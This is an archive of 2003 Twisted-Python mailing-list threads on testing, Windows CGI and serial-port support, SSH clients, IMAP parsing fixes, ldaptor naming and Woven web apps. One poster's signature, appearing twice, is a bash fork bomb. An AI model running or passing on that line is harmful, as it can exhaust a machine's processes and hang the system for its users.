> > Outlook, Windows 2000, MacOS X, (Apple) Address Book, Eudora, Netscape Mail, etc.
>   1                               2                     3       4
> 
> 	Applications, not operating systems have some way to use LDAP.
                                           ^that

-- 
:(){ :|:&};:



From pp64 at cornell.edu  Wed Jul  2 18:46:44 2003
From: pp64 at cornell.edu (Pavel Pergamenshchik)
Date: Wed, 2 Jul 2003 20:46:44 -0400
Subject: [Twisted-Python] twisted.trial.unittest.TestCase now now has an mktemp() method
Message-ID: <20030702204644.6a10f0bd.pp64@cornell.edu>

Hi.
Please don't use tempfile.mktemp() in tests -- use "self.mktemp" instead. It gives names from nice, organized directory structure under _trial_temp/, which is much better than putting stuff with cryptic names all over /tmp. I modified all tests that use mktemp. Yell at me if something suddenly breaks.

Pahan



From cliechti at gmx.net  Wed Jul  2 18:48:20 2003
From: cliechti at gmx.net (Chris Liechti)
Date: Thu, 03 Jul 2003 02:48:20 +0200
Subject: [Twisted-Python] [patch] win32serialport win98 support
Message-ID: <3F037D54.4050201@gmx.net>

i'd call it a "crappy OS support patch" ;-) there are a few flaws in 
win98, e.g. reading zero bytes blocks forever and such.
this patch provides workarounds so that the serial port can be used on 
both, Win98/ME and the NT/2k/XP series.

i tested on win98, nt4, 2k and xp.

chris
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: win32serialport.py.patch
URL: </pipermail/twisted-python/attachments/20030703/86c43700/attachment.ksh>

From eltronic at juno.com  Wed Jul  2 19:37:52 2003
From: eltronic at juno.com (eltronic at juno.com)
Date: Wed, 2 Jul 2003 21:37:52 -0400
Subject: [Twisted-Python] cgi on win32 fails, process only available in this reactor on POSIX
Message-ID: <20030702.213804.-169917.0.eltronic@juno.com>

am I missing something to get cgi working?
running a web.tas created from a dos window,
when I navigate to http://localhost/moin.cgi

**edited [HTTPChannel,0,127.0.0.1] Traceback 
File "...\twisted\web\twcgi.py", line 130, in runProcess
   reactor.spawnProcess(p, self.filename, [self.filename]+qargs, env,
os.path.dirname(self.filename))
File "...\twisted\internet\default.py", line 168, in spawnProcess
   raise NotImplementedError, "process only available in this reactor on
POSIX"

judging from the one paragraph in book.pdf on cgi
I'm guessing its not a huge priority to have this 
work on win98 out of the box.
had the same problem with that Perlscript example.
looks like win cgi is made impossible in 
t.i.defaults.py where it appears to force posix 
and everything else is commented out.

tried adding this to scripts/mktap.py & scripts/twistd.py
and running msys the mingw bash shell

if sys.platform == 'win32':
    if os.getenv('MSYSTEM','nope')=='MINGW32':
        os.path = __import__('posixpath')
        os.sep='/'
which also produces the same error with any cgi

was the same in 1.0.5, currently using 1.0.6 
installed from source with setup.py 
which doesn't create any shortcuts
for tkmktap.py and is missing the twistenv.bat
like the installer created in 1.0.5
woulden't even try to compile c reactor,
otherwise installed ok. 
and, other web activity using html and rpy works.

on another front:
scripts/trial.py won't run from msys
some strange path stuff at the top
causes  ./scripts and ../Lib/site-packages
to be duplicated several times in sys.path and then
ImportError: No module named twisted.scripts.trial

from dos window all the tests try to run

from dos window
$ python trial.py -p twisted.test
protocols\dns.py:50: RuntimeWarning: PyCrypto not available -
   proceeding with non-cryptographically secure random source
$ is too, and I tryed changing a few things,  but ok,
then a bunch of tracebacks
KeyError: Invalid OID 65207c3d20524544 (too large)
-----------
Ran 797 tests in 1121.250s

FAILED (failures=5, errors=9, skips=28, expectedFailures=4)
leaves about 150k of junk in scripts/_trial_temp

am I missing something to get cgi working?
in reply please, don't be afraid to state the obvious.

________________________________________________________________
The best thing to hit the internet in years - Juno SpeedBand!
Surf the web up to FIVE TIMES FASTER!
Only $14.95/ month - visit www.juno.com to sign up today!



From anders at bruun-olsen.net  Wed Jul  2 20:12:30 2003
From: anders at bruun-olsen.net (Anders Bruun Olsen)
Date: Thu, 3 Jul 2003 04:12:30 +0200
Subject: [Twisted-Python] Can't get ssh-connections to work
Message-ID: <20030703021230.GB5058@elmer.skumleren.net>

Hi,

I am brand-spanking new at twisted but wanted to make an app that
connects through ssh to a remote machine and fetches some info, which I
thought twisted to be perfect for. I am trying to get the ssh example to
work but it just hangs!

I have entered it exactly as it is on the webpage (cut-and-paste and the
fixed the indentions). The only thing changed is the host to connect to,
there I have chosen a server I have running on my LAN.
I have also added a call to log.startLogging(sys.stdout, setStdout=0) to
get some logging output to see if I could figure out the problem. This
is the output I get:

2003/07/03 04:04 CEST [-] Log opened.
2003/07/03 04:04 CEST [-] Starting factory <twisted.internet.protocol.ClientFactory instance at 0x8359c0c>
2003/07/03 04:04 CEST [-] Stopping factory <twisted.internet.protocol.ClientFactory instance at 0x8359c0c>

Then it just hangs there until I break it. I can't see any connection on
the server, so I don't think it even gets that far.

What might be the problem here?

-- 
Anders
-----BEGIN GEEK CODE BLOCK-----
Version: 3.12
GCS/O d--@ s:+ a-- C++ $UL+++ P++ L+++ E- W+ N(+) o K? w O- M-- V
PS+ PE@ Y+ PGP+ t 5 X R+ tv+ b+ DI+++ D+ G e- h !r y?
------END GEEK CODE BLOCK------
PGPKey: http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x8BFECB41



From z3p at twistedmatrix.com  Wed Jul  2 22:41:26 2003
From: z3p at twistedmatrix.com (Paul Swartz)
Date: Thu, 03 Jul 2003 00:41:26 -0400
Subject: [Twisted-Python] Can't get ssh-connections to work
In-Reply-To: <20030703021230.GB5058@elmer.skumleren.net>
Message-ID: <3F037BB6.23532.7B81244@localhost>

On 3 Jul 2003 at 4:12, Anders Bruun Olsen wrote:

> Hi,
> 
> I am brand-spanking new at twisted but wanted to make an app that
> connects through ssh to a remote machine and fetches some info, which I
> thought twisted to be perfect for. I am trying to get the ssh example to
> work but it just hangs!
> 
> I have entered it exactly as it is on the webpage (cut-and-paste and the
> fixed the indentions). The only thing changed is the host to connect to,
> there I have chosen a server I have running on my LAN.
> I have also added a call to log.startLogging(sys.stdout, setStdout=0) to
> get some logging output to see if I could figure out the problem. This
> is the output I get:

Could you send me the code you've got?  Also, try the example in 
doc/examples/sshsimpleclient.py

-p
-- 
     Paul Swartz
(o_  http://twistedmatrix.com/users/z3p.twistd/
//\  z3p at twistedmatrix.com
V_/_ AIM: Z3Penguin




From jml at ids.org.au  Thu Jul  3 00:12:03 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Thu, 3 Jul 2003 16:12:03 +1000
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030703054426.GC665@sting>; from jml@ids.org.au on Thu, Jul 03, 2003 at 15:44:26 +1000
References: <20030703054426.GC665@sting>
Message-ID: <20030703061203.GE665@sting>

One of the goals with Issues was to have something usable by the 
developers and users of Twisted, as there is much dissatisfaction with 
sourceforge's tracker. If people would like to see Issues used in this 
way, then I'd appreciated being told about any important missing 
features, so things can start actually happening.

If not, and there is some other solution in mind, let's switch to that 
now, and kill off Issues entirely (except perhaps as an example). After 
all "code is a liability, functionality is an asset".

cheers,
jml



From lafou at wanadoo.fr  Thu Jul  3 02:47:44 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 03 Jul 2003 10:47:44 +0200
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030703061203.GE665@sting>
References: <20030703054426.GC665@sting>  <20030703061203.GE665@sting>
Message-ID: <1057222064.2353.12.camel@biproc>

On Thu, 2003-07-03 at 08:12, Jonathan Lange wrote:
> One of the goals with Issues was to have something usable by the 
> developers and users of Twisted, as there is much dissatisfaction with 
> sourceforge's tracker. If people would like to see Issues used in this 
> way, then I'd appreciated being told about any important missing 
> features, so things can start actually happening.
> 
> If not, and there is some other solution in mind, let's switch to that 
> now, and kill off Issues entirely (except perhaps as an example). After 
> all "code is a liability, functionality is an asset".


I think it's a good idea. This also demonstrates how twisted (and specially Woven)
can be used to create some applications.





From exarkun at intarweb.us  Thu Jul  3 03:11:22 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Thu, 3 Jul 2003 05:11:22 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <200307022114.h62LEMw2001260@fido.strakt.com>
References: <200307022114.h62LEMw2001260@fido.strakt.com>
Message-ID: <20030703091122.GA31417@intarweb.us>

On Wed, Jul 02, 2003 at 11:14:22PM +0200, Anders Hammarquist wrote:
> Hi!
> 
> Here are the changes for handling literals I talked about earlier.
> So far I've only looked at the server part, but it seems to work
> nicely. There's still work to do on improving the argument parser
> functions, as some arguments can probably be parsed into a nicer
> format than used now.

  Great stuff, I really really like your solution to the parsing problem. 
The patch is now applied, with a couple changes:

  * MessageSet.__iadd__ was renamed to MessageSet.extend.  __iadd__ gives me
nightmares.

  * I re-arranged the MessageSet.last property code in a trivial manner to
keep the class namespace cleaner.  As a result, _getLast and _setLast are no
longer available explicitly, only implicitly through reads and writes of the
property.

  I am unsure about the usefulness of the LiteralString class in its current
state.  It seems to open up the possiblity of an unbounded memory usage
attack against the server.  I'm considering either removing it and using
LiteralFile in its place, or adding a limit to the size of string it will
accept (something on the order of a kilobyte or two, though I will check
exactly what might get passed to it by a benign client before picking a
default limit).  Do you have any particular reason to want to keep it, or to
keep it unlimited?

  I suppose I will be thinking about how to apply a similar change to the
client code, where it will have (at least to me ;) a much more noticable
affect on performance.  It seems a little tougher, but maybe a mapping of
responses to parsers would do the job...  Any ideas in this area would be
welcome :)

  Thanks again for this contribution,

  Jp
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030703/be7ed160/attachment.sig>

From iko at cd.chalmers.se  Thu Jul  3 05:09:10 2003
From: iko at cd.chalmers.se (Anders Hammarquist)
Date: Thu, 03 Jul 2003 13:09:10 +0200
Subject: [Twisted-Python] Re: IMAP fixes 
In-Reply-To: <20030703091122.GA31417@intarweb.us> 
References: <200307022114.h62LEMw2001260@fido.strakt.com> <20030703091122.GA31417@intarweb.us> 
Message-ID: <200307031109.h63B9A210604@haddock.cd.chalmers.se>

In a message of Thu, 03 Jul 2003 05:11:22 EDT, Jp Calderone writes:
>  Great stuff, I really really like your solution to the parsing problem. 
>The patch is now applied, with a couple changes:

[...]

>  I am unsure about the usefulness of the LiteralString class in its current
>state.  It seems to open up the possiblity of an unbounded memory usage
>attack against the server.  I'm considering either removing it and using
>LiteralFile in its place, or adding a limit to the size of string it will
>accept (something on the order of a kilobyte or two, though I will check
>exactly what might get passed to it by a benign client before picking a
>default limit).  Do you have any particular reason to want to keep it, or to
>keep it unlimited?

Yes, I absolutely want to keep it, but there should be no reason to keep
it unlimitied. There are lots of places (particularly for mailbox names)
where the grammar accepts atom or quoted or literal, and it would be a
nightmare to have to deal with a string that sometimes may be a file (and
keeping short strings like "inbox" in a file seems silly too). So please
keep it, but I see no problems with limiting it to a few kb.

How about this:

-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: text/x-patch
Size: 1011 bytes
Desc: twisted-imap-030703
URL: </pipermail/twisted-python/attachments/20030703/6f101ea7/attachment-0002.bin>
-------------- next part --------------
>  I suppose I will be thinking about how to apply a similar change to the
>client code, where it will have (at least to me ;) a much more noticable
>affect on performance.  It seems a little tougher, but maybe a mapping of
>responses to parsers would do the job...  Any ideas in this area would be
>welcome :)

I'll have a look at it and see if I can come up with any ideas.

/Anders

-- 
 -- Of course I'm crazy, but that doesn't mean I'm wrong.
Anders Hammarquist                                  | iko at cd.chalmers.se
Physics student, Chalmers University of Technology, | Hem: +46 31 88 48 50
G|teborg, Sweden.           RADIO: SM6XMM and N2JGL | Mob: +46 707 27 86 87

From exarkun at intarweb.us  Thu Jul  3 05:25:40 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Thu, 3 Jul 2003 07:25:40 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <200307031109.h63B9A210604@haddock.cd.chalmers.se>
References: <200307022114.h62LEMw2001260@fido.strakt.com> <20030703091122.GA31417@intarweb.us> <200307031109.h63B9A210604@haddock.cd.chalmers.se>
Message-ID: <20030703112540.GA31749@intarweb.us>

On Thu, Jul 03, 2003 at 01:09:10PM +0200, Anders Hammarquist wrote:
> In a message of Thu, 03 Jul 2003 05:11:22 EDT, Jp Calderone writes:
> >  Great stuff, I really really like your solution to the parsing problem. 
> >The patch is now applied, with a couple changes:
> 
> [...]
> 
> > [snip]
> 
> Yes, I absolutely want to keep it, but there should be no reason to keep
> it unlimitied. There are lots of places (particularly for mailbox names)
> where the grammar accepts atom or quoted or literal, and it would be a
> nightmare to have to deal with a string that sometimes may be a file (and
> keeping short strings like "inbox" in a file seems silly too). So please
> keep it, but I see no problems with limiting it to a few kb.
> 
> How about this:
> 

  This looks perfect.  Applied.

Content-Description: twisted-imap-030703

> >  I suppose I will be thinking about how to apply a similar change to the
> >client code, where it will have (at least to me ;) a much more noticable
> >affect on performance.  It seems a little tougher, but maybe a mapping of
> >responses to parsers would do the job...  Any ideas in this area would be
> >welcome :)
> 
> I'll have a look at it and see if I can come up with any ideas.

  Thanks!

  Jp
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030703/30a3f6aa/attachment.sig>

From lac at strakt.com  Thu Jul  3 10:11:03 2003
From: lac at strakt.com (Laura Creighton)
Date: Thu, 3 Jul 2003 18:11:03 +0200
Subject: [Twisted-Python] Paul Baranowski recommends developing in Python in part:
Message-ID: <200307031611.h63GB3C7018183@ratthing-b246.strakt.com>

... "Python has some amazing 3rd party languages, all of them
cross-platform: WxPython for GUI development, pyGame for 2D graphics,
and Twisted for network programming. "

http://peek-a-booty.org/Docs/WhichLanguageDoYouRecommend.htm
http://www.peek-a-booty.org/pbhtml/index.php

Laura



From anders at bruun-olsen.net  Thu Jul  3 13:49:30 2003
From: anders at bruun-olsen.net (Anders Bruun Olsen)
Date: Thu, 3 Jul 2003 21:49:30 +0200
Subject: [Twisted-Python] Can't get ssh-connections to work
In-Reply-To: <3F037BB6.23532.7B81244@localhost>
References: <20030703021230.GB5058@elmer.skumleren.net> <3F037BB6.23532.7B81244@localhost>
Message-ID: <20030703194924.GA5565@elmer.skumleren.net>

On Thu, Jul 03, 2003 at 12:41:26AM -0400, Paul Swartz wrote:
> > I am brand-spanking new at twisted but wanted to make an app that
> > connects through ssh to a remote machine and fetches some info, which I
> > thought twisted to be perfect for. I am trying to get the ssh example to
> > work but it just hangs!
> > I have entered it exactly as it is on the webpage (cut-and-paste and the
> > fixed the indentions). The only thing changed is the host to connect to,
> > there I have chosen a server I have running on my LAN.
> > I have also added a call to log.startLogging(sys.stdout, setStdout=0) to
> > get some logging output to see if I could figure out the problem. This
> > is the output I get:
> Could you send me the code you've got?  Also, try the example in 
> doc/examples/sshsimpleclient.py

sshsimpleclient.py works, so it is either me who has done something
wrong when copy-pasting the code from the howto or perhaps the howto
needs to be updated? It looks like sshsimpleclient.py and the code in
the howto uses different classes?!?

The howto I am talking about is this one:
http://www.twistedmatrix.com/documents/howto/conch_client

Just to make sure we are all talking about the same thing :)

I'll study sshsimpleclient.py to learn how it works.

-- 
Anders
-----BEGIN GEEK CODE BLOCK-----
Version: 3.12
GCS/O d--@ s:+ a-- C++ $UL+++ P++ L+++ E- W+ N(+) o K? w O- M-- V
PS+ PE@ Y+ PGP+ t 5 X R+ tv+ b+ DI+++ D+ G e- h !r y?
------END GEEK CODE BLOCK------
PGPKey: http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x8BFECB41



From cce at clarkevans.com  Thu Jul  3 15:52:22 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Thu, 3 Jul 2003 21:52:22 +0000
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702142838.GC10309@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog>
Message-ID: <20030703215222.GA86483@doublegemini.com>

On Wed, Jul 02, 2003 at 05:28:38PM +0300, Tommi Virtanen wrote:
| > After reading the RFC, it seems that "entry" is most often used
| > to mean an object in the LDAP database.
| 
| 	I'm guessing you won't be happy even after an
| 	s/LDAPObject/LDAPEntry/g operation, so I'm not
| 	doing that right now..

FYI, the python-ldap interface has an LDAPObject, but this
more or less represents a connection to the LDAP directory.
In any case, if you use LDAPObject in a different sence it
will rule out your ability to have the same API as OpenLDAP,
and thus python-ldap.    Also note that it uses 'entry' in
the RFC1823 (C API for LDAP) quite extensively.

Best,

Clark



From 2002 at weholt.org  Thu Jul  3 16:59:09 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Fri, 4 Jul 2003 00:59:09 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
Message-ID: <014301c341b6$b7509230$0401a8c0@razor>

I could take a peek at? Hopefully, something simple. I'm currently trying to
get a grip on how to build a site using Twisted methods and use Issues Alpha
1 as a foundation for that. But there are too many things going on and it's
hard to get a hang of why things are done they way they are.

What I need is something that :

1. don't use rpys, but Site and Application
2. starts a service which holds some persistent data and does a scheduled
call to a long-running, blocking method once a while
3. implements some kind of authentication
4. use Woven
5. hopefully has some way of keeping the same design for all it's pages,
using a master template and populating it with data at run-time or something
similar
6. it would be nice if it also showed how to dynamically add pages
subclassing Woven.Page using putChild if these pages was in a given folder.

Demanding request? Sorry, but I got a bunch of working, yet blocking and
non-Twisted-friendly code lying around which could be of interest to people
if I just got the basics working.

Any kind of help would be nice.

In advance, thanks a bunch.

Best regards,
Thomas







From jml at ids.org.au  Thu Jul  3 22:03:22 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Fri, 4 Jul 2003 14:03:22 +1000
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <014301c341b6$b7509230$0401a8c0@razor>; from 2002@weholt.org on Fri, Jul 04, 2003 at 08:59:09 +1000
References: <014301c341b6$b7509230$0401a8c0@razor>
Message-ID: <20030704040322.GA8465@sting>

On 2003.07.04 08:59, Thomas Weholt wrote:

> Demanding request? Sorry, but I got a bunch of working, yet blocking
> and non-Twisted-friendly code lying around which could be of interest 
> to people

Kind of. You don't really need a single project that has all six of 
your desires, as each is more or less independent. In fact, each of 
these pieces is pretty simple. 
If your problem lies in figuring out how to stick them all together, 
you will need to be more specific in what you are trying to do.

> 1. don't use rpys, but Site and Application

RPYs and Site / Application are two ways of going about the same thing.
In Issues, you will notice that issues/tap/web.py uses Site / 
Application to create a web server.

Although Issues comes with an RPY, it doesn't need one.

> 2. starts a service which holds some persistent data and does a 
> scheduled call to a long-running, blocking method once a while

Lots of stuff does persistent data. Issues uses world. 
A scheduled call to a blocking method could probably be done quite 
simply using deferToThread and callLater. (Some t.internet expert 
should confirm this). The "Scheduling" howto may help with this.

> 3. implements some kind of authentication

Again, Issues uses it's own kind of authentication, rather than any 
implementation of cred. This is mainly because my brain obstinately 
refuses to understand guard. 
Divmod uses cred and guard for authentication.

> 4. use Woven

Issues, Plonk, Divmod, Blog.

> 5. hopefully has some way of keeping the same design for all it's
> pages, using a master template and populating it with data at run-
> time or something similar

Someone here has suggested using ExpandMacro for this. I have steered 
clear of this in Issues, being content to copy-and-paste the basic 
layout of each page. (Although much of the content is shared)

> 6. it would be nice if it also showed how to dynamically add pages
> subclassing Woven.Page using putChild if these pages was in a given
> folder.

getDynamicChild is your friend! It is demonstrated in almost every 
existing Woven application (including Issues)

Hope this helps,
jml



From tv at twistedmatrix.com  Fri Jul  4 00:03:37 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Fri, 4 Jul 2003 09:03:37 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030703215222.GA86483@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030703215222.GA86483@doublegemini.com>
Message-ID: <20030704060337.GA17938@lapdog>

On Thu, Jul 03, 2003 at 09:52:22PM +0000, Clark C. Evans wrote:
> In any case, if you use LDAPObject in a different sence it
> will rule out your ability to have the same API as OpenLDAP,
> and thus python-ldap.    Also note that it uses 'entry' in
> the RFC1823 (C API for LDAP) quite extensively.

	I am very dedicated to providing an API that is radically
	different from the OpenLDAP API.

-- 
:(){ :|:&};:



From lafou at wanadoo.fr  Fri Jul  4 02:00:27 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 04 Jul 2003 10:00:27 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <20030704040322.GA8465@sting>
References: <014301c341b6$b7509230$0401a8c0@razor>
	 <20030704040322.GA8465@sting>
Message-ID: <1057305627.22303.20.camel@biproc>

Hello all

I think woven is getting more mature now, but it lacks some important 
documentation parts (guard, sessions, etc.).

Moreover, maybe woven needs now a community site like www.zope.org. It would be interresting
to share some little apps arround woven, that can be used as modules in other applications.
MVC allows us to do that, let's use it !







From janko at mind-nest.com  Fri Jul  4 02:12:38 2003
From: janko at mind-nest.com (janko at mind-nest.com)
Date: Fri, 4 Jul 2003 10:12:38 +0200
Subject: [Twisted-Python] Extending t.w.spider
Message-ID: <00db01c34204$08f85260$2dc8fea9@jankotov>

Bok,

I am sending this as suggested by "forgot who" on #twisted. 

I extended t.w.spider , this isn't finished. It seems to work however. 
You can download, run it and look it crawl ower certain domain ... It prints out
quite few information doing work so you know what is going on ( mainly for testing purposes ).

I am hoping just for a quick scan thru code and run by someone more experienced in this. So I will know if I did it python/twisted/sane way, before I go further and conect it to various stuff. ( also read NOTE at the end of email )

You can get this at http://www.mind-nest.com/downloads/walker.tgz or 
http://www.mind-nest.com/downloads/walker.zip

When finished I plan give it back to twisted... of course if they will
accept it.

note for the maillist moderator: I sent this mail when I was not yet a member some week ago, I got response that you must first approve it. As it didn't happen in 1 week and I am a member now I sent it again as a member.

lp
:janko
janko at mind-nest.com
www.mind-nest.com


***

This module extends twisted.web.spider.SpiderSender class into WalkerSender
(and also extends htmllib.HTMLParser and t.w.c.HTTPClientFactory so
WalkerSender can use them):

    LinkParser
    -collects links on a page
    -also collects frame scr-es, to crawl ower frames
    -can also collect images, links(css,js..) for link/img validating
purposes

    HTTPCollector
    -Doesnt store content of page to file but to variable
    -Can be easily set to diferent link-parsers or page-downloaders(*)..
    -Returns *self* to the callback, so that links, content, or anything
else it collects can be retrieved
    by the callback method. (**)

    WalkerSender
    -Can be easily set to diferent http-collectors/downloaders(***)..
    -Uses dictionary instead of list for queue now.. explaind below
    -Has 4 more plugins/events, some existent are cahnged to be more
powerfull
    -Plugin to filter links to whatever you wanth (extensions, domains...)
    -Plugin to fill with some algorithm to prevent from looping
    -Plugin to notify that download failed
    -Plugin to tell that all links found while crawling were crawled and
there is nowwhere else to go
    (Likely/hopefully to occur if doing One Site/domain crawler as I was,
and when timeouting or some other shit happens)
    -Plugin notifyDownloadEnd has aditional argument downloader which holds
anything you prepare in dowloader class(****)

    some smaller things were made to get it working
    -preventing from starting downloader on page/url that is already
downloading
    -queue (is now dictionary) so it can't have multiple same pages in it
(the depth of the first ocurrence is stored)
    -removes fragments from urls (www.a.org/index.html#fragment) so we get
multiple -same- pages that are then filtered
    -it doesnt remove ?queries as they often mean new content..

    I made OneSiteWalkerSender as an example.. I intend to make one site
search engine (with pyndex probably) and a
    anchor/link/img... validating script. OneSiteWalkerSender has just now
crawled ower 525 pages of www.google.com.
    I also tested it with other sites.

    NOTE: Don't shoot me or something if I made something very stupid, I am
very new to Python and Twisted
    and don't understand many important issues on any of them. Where I
marked with * in upper description I am a little
    suspicious with my way of doing it.

***

-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030704/5f94bd05/attachment.html>

From m at moshez.org  Fri Jul  4 02:49:50 2003
From: m at moshez.org (Moshe Zadka)
Date: 4 Jul 2003 08:49:50 -0000
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <014301c341b6$b7509230$0401a8c0@razor>
References: <014301c341b6$b7509230$0401a8c0@razor>
Message-ID: <20030704084950.4055.qmail@green.zadka.com>

On Fri, 4 Jul 2003, "Thomas Weholt" <2002 at weholt.org> wrote:

> I could take a peek at? Hopefully, something simple. I'm currently trying to
> get a grip on how to build a site using Twisted methods and use Issues Alpha
> 1 as a foundation for that. But there are too many things going on and it's
> hard to get a hang of why things are done they way they are.

Did you try looking at bannerfish?
[Follow the links from itamarst.org]
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From illumen at yahoo.com  Fri Jul  4 03:56:35 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Fri, 04 Jul 2003 19:56:35 +1000
Subject: [Twisted-Python] Finding peers.
Message-ID: <3F054F53.8080909@yahoo.com>

Hello,

just wondering if anyone has/knows of any code to find peers on the network?





From illumen at yahoo.com  Fri Jul  4 04:00:22 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Fri, 04 Jul 2003 20:00:22 +1000
Subject: [Twisted-Python] User notes for documentation.
Message-ID: <3F055036.9010807@yahoo.com>

hey

Would it be possible to add a user notes system to the twisted 
documentation?

Examples of projects that use this are the postgresql, crystalspace, and 
php.



Have fun,
Rene.




From andrew-twisted at puzzling.org  Fri Jul  4 04:47:39 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 4 Jul 2003 20:47:39 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <3F055036.9010807@yahoo.com>
References: <3F055036.9010807@yahoo.com>
Message-ID: <20030704104739.GA26311@frobozz>

On Fri, Jul 04, 2003 at 08:00:22PM +1000, Rene Dudfield wrote:
> hey
> 
> Would it be possible to add a user notes system to the twisted 
> documentation?
> 
> Examples of projects that use this are the postgresql, crystalspace, and 
> php.

It could probably be done; but personally I've never much liked those
systems.  I'd much rather have suggestions and criticisms sent to the
mailing list (or bug tracker), where they can be discussed more easily, and
then have any improvements integrated into the proper docs.

Documentation patches are most welcome -- and you can already send those to
this mailing list!

If people feel their comments on the docs are too trivial to bother the main
list, then perhaps there is justification for a twisted-docs list?  At the
moment, though, there doesn't seem to be enough interest from non-developers
to improve the docs to justify a seperate list -- or to justify the effort
involved in adding a user notes system to the online docs.

[Sadly, wikis and other systems reliant upon the community for the bulk of
the content don't seem to be a magic bullet to creating the docs everyone
wishes they had.]

-Andrew.




From m at moshez.org  Fri Jul  4 08:00:46 2003
From: m at moshez.org (Moshe Zadka)
Date: 4 Jul 2003 14:00:46 -0000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <20030704104739.GA26311@frobozz>
References: <20030704104739.GA26311@frobozz>, <3F055036.9010807@yahoo.com>
Message-ID: <20030704140046.8803.qmail@green.zadka.com>

On Fri, 4 Jul 2003, Andrew Bennetts <andrew-twisted at puzzling.org> wrote:

> Documentation patches are most welcome -- and you can already send those to
> this mailing list!

Yes!
But also, any comments on the documentation. From "all links are broken"
to "howto X is hard to find" and "on page 155, 'foo' should be 'bar'"
are all welcome here. If there'll be too many comments like that, we may
then redirect it into another list, but I certainly don't want to lose
those comments -- and have them on the website, where they can't be
dealt with, is not a good idea. Having seen the quality of tips on the PHP
site, I'm also hesistant about the tips themselves :)
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From domma at procoders.net  Fri Jul  4 08:13:54 2003
From: domma at procoders.net (Achim Domma (ProCoders))
Date: Fri, 4 Jul 2003 16:13:54 +0200
Subject: [Twisted-Python] minor beginner questions
Message-ID: <FCEMIEFBFOIDAOJDEPIAIENKFKAA.domma@procoders.net>

Hi,

playing around with twisted.web, I have some minor questions:

- In another message a function 'deferToThread' was mentioned. I tought that
somethink like must be available in twisted but could not find it. Is there
an example on how to use it?

- Is it possible to create resources in my startup script, where I create my
application. Instead of having a simple *.rpy with
resouce=SomeClassInstance() I would like to use addChild on the root of my
app. Is that possible?

- If I want to keep a Connection to a ZODB, should I store it in the
registry or is there a besser place to store it?

regards,
Achim




From 2002 at weholt.org  Fri Jul  4 04:13:44 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 4 Jul 2003 12:13:44 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
References: <014301c341b6$b7509230$0401a8c0@razor> <20030704084950.4055.qmail@green.zadka.com>
Message-ID: <000b01c34238$3d775b60$3ba8a8c0@gatsoft.no>

It's based on Twisted < 1.0. Will that affect anything?

Thomas

----- Original Message -----
From: "Moshe Zadka" <m at moshez.org>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 10:49 AM
Subject: Re: [Twisted-Python] Does anybody have a working project ...


> On Fri, 4 Jul 2003, "Thomas Weholt" <2002 at weholt.org> wrote:
>
> > I could take a peek at? Hopefully, something simple. I'm currently
trying to
> > get a grip on how to build a site using Twisted methods and use Issues
Alpha
> > 1 as a foundation for that. But there are too many things going on and
it's
> > hard to get a hang of why things are done they way they are.
>
> Did you try looking at bannerfish?
> [Follow the links from itamarst.org]
> --
> Moshe Zadka -- http://moshez.org/
> Buffy: I don't like you hanging out with someone that... short.
> Riley: Yeah, a lot of young people nowadays are experimenting with
shortness.
> Agile Programming Language -- http://www.python.org/
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From 2002 at weholt.org  Fri Jul  4 04:14:51 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 4 Jul 2003 12:14:51 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
